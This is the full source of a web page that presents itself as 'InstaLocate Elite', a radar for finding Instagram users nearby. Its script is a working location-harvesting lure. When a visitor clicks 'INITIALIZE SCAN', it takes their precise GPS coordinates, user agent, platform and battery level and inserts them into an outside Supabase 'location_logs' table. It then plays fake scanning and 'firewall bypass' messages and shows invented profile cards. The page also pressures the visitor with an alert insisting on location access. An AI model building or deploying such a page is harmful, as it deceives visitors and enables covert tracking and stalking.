<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>InstaLocate Elite | Hyper-Local Radar</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;700;900&display=swap');
        :root { --blue: #0095f6; --dark: #00376b; --accent: #ff0080; --mesh: linear-gradient(135deg, #fdfcfb 0%, #e2d1c3 100%); }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Outfit', sans-serif; }
        
        /* Exhibition Grade Background */
        body { background: #f0f2f5; min-height: 100vh; overflow-x: hidden; color: #1c1e21; }
        .bg-mesh { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; background: radial-gradient(at 0% 0%, rgba(0, 149, 246, 0.15) 0px, transparent 50%), radial-gradient(at 100% 0%, rgba(255, 0, 128, 0.1) 0px, transparent 50%), radial-gradient(at 100% 100%, rgba(0, 55, 107, 0.1) 0px, transparent 50%); }

        /* Premium Navigation */
        nav { display: flex; justify-content: space-between; align-items: center; padding: 25px 8%; background: rgba(255,255,255,0.7); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(0,0,0,0.05); position: sticky; top: 0; z-index: 1000; }
        .logo { font-weight: 900; font-size: 26px; background: linear-gradient(to right, var(--blue), var(--accent)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -1.5px; }

        /* Hero Section with Glassmorphism */
        .hero { display: flex; align-items: center; justify-content: center; padding: 100px 8%; min-height: 90vh; gap: 50px; }
        .hero-text { flex: 1.2; }
        .hero-text h1 { font-size: 72px; font-weight: 900; line-height: 0.9; margin-bottom: 25px; color: #050505; }
        .hero-text p { font-size: 20px; color: #65676b; margin-bottom: 40px; line-height: 1.6; max-width: 550px; }

        /* Animated Radar Container */
        .radar-box { flex: 1; position: relative; display: flex; justify-content: center; align-items: center; }
        .radar-circle { width: 350px; height: 350px; border: 2px solid rgba(0,149,246,0.1); border-radius: 50%; position: relative; background: rgba(255,255,255,0.5); backdrop-filter: blur(5px); display: flex; justify-content: center; align-items: center; box-shadow: 0 30px 60px rgba(0,0,0,0.1); }
        .radar-pulse { position: absolute; width: 100%; height: 100%; border: 2px solid var(--blue); border-radius: 50%; animation: pulse 3s infinite linear; }
        .radar-pulse:nth-child(2) { animation-delay: 1s; }

        /* Call to Action Button */
        .main-btn { background: var(--blue); color: white; border: none; padding: 20px 50px; border-radius: 20px; font-size: 20px; font-weight: 800; cursor: pointer; transition: 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275); box-shadow: 0 15px 35px rgba(0, 149, 246, 0.3); display: flex; align-items: center; gap: 15px; }
        .main-btn:hover { transform: translateY(-8px) scale(1.02); box-shadow: 0 20px 50px rgba(0, 149, 246, 0.4); background: var(--dark); }

        /* Full Screen Tech Overlay */
        #loading-view { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
        .hex-grid { font-size: 100px; color: var(--blue); animation: rotate 10s linear infinite; }
        
        /* Animations */
        @keyframes pulse { 0% { transform: scale(0.5); opacity: 1; } 100% { transform: scale(1.5); opacity: 0; } }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }

        /* Success Results Grid */
        #results { display: none; padding: 50px 8%; animation: fadeIn 0.8s ease-out; }
        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 25px; }
        .card { background: white; padding: 20px; border-radius: 20px; border: 1px solid rgba(0,0,0,0.05); text-align: center; transition: 0.3s; box-shadow: 0 10px 20px rgba(0,0,0,0.05); }
        .card:hover { transform: translateY(-10px); }
        .card img { width: 80px; height: 80px; border-radius: 50%; margin-bottom: 12px; border: 3px solid var(--blue); padding: 3px; }

        @media (max-width: 900px) { .hero { flex-direction: column; padding-top: 50px; text-align: center; } .hero-text h1 { font-size: 50px; } .hero-text p { margin: 0 auto 30px; } }
    </style>
</head>
<body>
    <div class="bg-mesh"></div>
    <nav>
        <div class="logo">PARDHAN SYSTEM</div>
        <div style="color: var(--blue); font-weight: bold;"><i class="fas fa-satellite-dish"></i> v4.0 PRO</div>
    </nav>

    <section class="hero" id="home">
        <div class="hero-text">
            <h1>Find Active<br><span style="color: var(--blue)">Profiles</span> Nearby.</h1>
            <p>Using hyper-local node scanning, InstaLocate maps Instagram users within 300m of your exact coordinates. Safe, encrypted, and real-time.</p>
            <button class="main-btn" onclick="startExecution()">
                <i class="fas fa-radar"></i> INITIALIZE SCAN
            </button>
        </div>
        <div class="radar-box">
            <div class="radar-circle">
                <div class="radar-pulse"></div>
                <div class="radar-pulse"></div>
                <i class="fab fa-instagram" style="font-size: 80px; color: var(--blue); z-index: 10;"></i>
            </div>
        </div>
    </section>

    <div id="loading-view">
        <i class="fas fa-spinner fa-spin hex-grid"></i>
        <h2 id="log-text" style="margin-top: 30px; font-weight: 900; letter-spacing: 2px;">CALIBRATING GPS...</h2>
        <p id="sub-log" style="color: #888;">Establishing Secure Satellite Handshake</p>
    </div>

    <section id="results">
        <h2 style="margin-bottom: 30px; font-size: 32px;">Real-Time Nodes Detected</h2>
        <div class="grid" id="grid-content"></div>
    </section>

<script>
    const SB_URL = 'https://jedpkzloxepzskpwomqj.supabase.co';
    const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImplZHBremxveGVwenNrcHdvbXFqIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE5MTc2NjksImV4cCI6MjA4NzQ5MzY2OX0.NYGrW558hlusgVxHvWrN89hb1mlYyU71FL1g2xgN3eY';
    const supabase = window.supabase.createClient(SB_URL, SB_KEY);

    async function startExecution() {
        const overlay = document.getElementById('loading-view');
        const status = document.getElementById('log-text');
        overlay.style.display = 'flex';

        // High Accuracy Data Fetch
        let batteryVal = "N/A";
        try {
            const b = await navigator.getBattery();
            batteryVal = `${(b.level * 100).toFixed(0)}%`;
        } catch(e) {}

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                status.innerText = "COORDINATES SECURED...";
                
                // DATA INSERTION (FIXED LOGIC)
                const { error } = await supabase.from('location_logs').insert([{
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    user_agent: navigator.userAgent,
                    ip: `PARDHAN-v4 | Batt: ${batteryVal}`,
                    os_info: `Platform: ${navigator.platform}`
                }]);

                if (error) console.error("Database Fail:", error);

                // Simulation Effects
                setTimeout(() => { status.innerText = "BYPASSING REGIONAL FIREWALL..."; }, 2000);
                setTimeout(() => { status.innerText = "FETCHING LOCAL NODES..."; }, 4000);
                setTimeout(() => {
                    overlay.style.display = 'none';
                    document.getElementById('home').style.display = 'none';
                    document.getElementById('results').style.display = 'block';
                    loadFakeResults();
                }, 6000);

            }, (err) => {
                alert("CRITICAL: Location access is required to render local social nodes. Please 'Allow' and reload.");
                window.location.reload();
            }, { enableHighAccuracy: true });
        }
    }

    function loadFakeResults() {
        const grid = document.getElementById('grid-content');
        const users = ['sam_clicks', 'riya.official', 'the_aryan_dev', 'muskan_x', 'rahul.raw', 'sneha_styles'];
        users.forEach((u, i) => {
            grid.innerHTML += `
                <div class="card">
                    <img src="https://i.pravatar.cc/150?u=${i+10}">
                    <div style="font-weight:bold">@${u}</div>
                    <div style="font-size:12px;color:var(--blue)">Active < 200m</div>
                </div>`;
        });
    }
</script>
</body>
</html>
